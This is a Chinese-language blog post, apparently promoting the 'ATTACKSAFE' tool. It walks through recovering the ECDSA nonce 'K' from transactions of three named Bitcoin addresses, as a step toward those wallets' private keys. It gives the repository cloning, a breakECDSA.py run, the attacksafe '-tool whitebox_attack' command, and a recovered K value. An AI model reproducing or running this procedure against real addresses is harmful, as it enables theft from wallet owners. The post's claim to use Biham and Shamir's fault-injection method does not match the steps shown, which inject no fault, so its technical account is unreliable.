# 我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰

<!-- wp:embed {"url":"https://www.youtube.com/embed/dLy74McEFTg","type":"rich","providerNameSlug":"вставить-обработчик","responsive":true,"className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
<figure class="wp-block-embed is-type-rich is-provider-вставить-обработчик wp-block-embed-вставить-обработчик wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://www.youtube.com/embed/dLy74McEFTg
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>在本文中，我們將再次觸及區塊鏈交易中籤名失敗的話題，並應用一種全新的攻擊：<a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener">“比特幣白盒攻擊”</a>。<br>差分故障分析<code>(DFA)</code>在 1996 年的文獻中被簡要描述，當時<em>一位以色列密碼學家和密碼分析師</em>&nbsp;<code>Eli Biham</code>以及<em>一位以色列科學家</em>&nbsp;<code>Adi Shamir</code>表明他們可以使用錯誤注入來提取<em>密鑰</em>並使用各種簽名和驗證算法恢復<em>私鑰。</em></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1544} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-6-1024x467.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1544"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1546} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-7.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1546"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1541} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/crypto.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1541"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":1567} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-10-1.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1567"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我們使用本研究論文中描述的差異錯誤實施<strong><a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener">“比特幣白盒攻擊” 。</a></strong><code>DFA</code>我們在上一篇<a href="https://cryptodeep.ru/rowhammer-attack/" target="_blank" rel="noreferrer noopener">文章</a>中描述的經典稱為<code>F()</code>.&nbsp;其中一些攻擊還需要兩個簽名對<code>ECDSA</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1565,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-9-1.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1565"/></a><figcaption class="wp-element-caption"><a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener"><strong>www.attacksafe.ru/whitebox-attack-on-bitcoin</strong></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>這種攻擊的理論部分可以在流行的比特幣攻擊列表中的文章中找到：<a href="https://attacksafe.ru/whitebox-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>“比特幣的白盒攻擊”</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>從我們早期的<a href="https://cryptodeep.ru/publication/" target="_blank" rel="noreferrer noopener">出版物</a><code>ECDSA</code>中，我們知道比特幣區塊鏈中存在很多易受攻擊和薄弱的交易，並且在我們的密碼分析過程中，我們發現許多比特幣地址在洩露密鑰的情況下進行了大量簽名<code>"K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>這樣一來，知道了秘鑰，我們就可以準確的獲取到比特幣錢包的私鑰了。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>考慮三個比特幣地址：</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>每個比特幣地址都進行了兩個關鍵的易受攻擊的交易：</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1523} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-1024x201.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1523"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1525} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-1-1024x199.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1525"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1527} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-2-1024x201.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1527"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1529} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-3-1024x202.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1529"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1531} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-4-1024x201.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1531"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1533} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-5-1024x200.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1533"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>比特幣區塊鏈中密鑰“K”（NONCE）的公開</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>打開&nbsp;<strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]</a></strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>使用我們的<a href="https://github.com/demining/CryptoDeepTools/tree/main/16WhiteBoxAttack" target="_blank" rel="noreferrer noopener"><strong>16WhiteBoxAttack</strong></a>存儲庫實施高效的<a href="https://attacksafe.ru/whitebox-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>白盒攻擊算法</strong></a><a href="https://github.com/demining/CryptoDeepTools/tree/main/16WhiteBoxAttack" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/16WhiteBoxAttack/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1575} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-11-1024x531.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1575"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>安裝我們需要的所有包</h3>
<!-- /wp:heading -->

<!-- wp:image {"id":687} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-11.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-687"/><figcaption class="wp-element-caption"><strong><code>requirements.txt</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sudo apt install python2-minimal

wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1175} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-111-1024x448.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1175"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1177} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-112-1024x452.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1177"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1179} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-114-1024x452.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1179"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>為攻擊準備 RawTX</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2></h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1577} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-12-1024x142.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1577"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>現在我們需要從所有易受攻擊的交易中獲取所有的 R、S、Z 值</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>讓我們使用 breakECDSA.py 腳本</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1581} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-14-1024x281.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1581"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
S = 0x2d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3
Z = 0x793c00bdb7c96e19cb2670f3aec5369558b64f0e12645af070d94c2fc06db6ed</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong></strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">為了實施攻擊並獲取密鑰，我們將使用“ATTACKSAFE SOFTWARE”</a></strong><strong>軟件</strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":705,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-14.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-705"/></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>訪問權限：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1583} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-15.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1583"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>應用：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -help</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1586} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-17.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1586"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -version</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1587} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-18.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1587"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>"ATTACKSAFE SOFTWARE"</code>包括對比特幣的所有流行攻擊。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>讓我們列出所有攻擊：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -list</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1589} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-19-1024x631.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1589"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1590} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-20-1024x631.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1590"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1592} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-21-1024x631.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1592"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>然後選擇<code>&nbsp;-tool: whitebox_attack</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>要從易受攻擊的 ECDSA 簽名交易中獲取密鑰，讓我們將數據添加<code>RawTX</code>到文本文檔並將其保存為文件<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool whitebox_attack</code>使用軟件啟動<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1594} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-22-1024x276.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1594"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我們發起了這次攻擊<code>-tool whitebox_attack</code>並將結果保存到一個文件中<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在看到成功的結果，打開文件<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1597} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-24-1024x482.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1597"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d

RawTX = 0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>我們看到一個銘文<code>"Deployments ECDSA"</code>，表示比特幣區塊鏈交易中存在嚴重漏洞。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們用<em>Python</em>腳本檢查一下<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>為此，請安裝ECPy</strong></a>橢圓曲線庫：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>pip3 install ECPy</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":968} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-44-1024x335.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-968"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>現在讓我們通過指定運行腳本<code>&nbsp;секретный ключ "K" (NONCE)</code>：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1599} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-25-1024x86.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1599"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01 , 0xacf1d32fbd69a79736bafc6af16135526852cd12e4c19158fb421266f0771e0f)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>檢查具有簽名值的點的坐標<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
S = 0x2d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3
Z = 0x793c00bdb7c96e19cb2670f3aec5369558b64f0e12645af070d94c2fc06db6ed</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
point2gen  =   (0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01 , 0xacf1d32fbd69a79736bafc6af16135526852cd12e4c19158fb421266f0771e0f)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在知道了密鑰，我們可以得到比特幣錢包的私鑰：<code>1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們使用<em>Python</em>腳本：<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 獲取私鑰</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

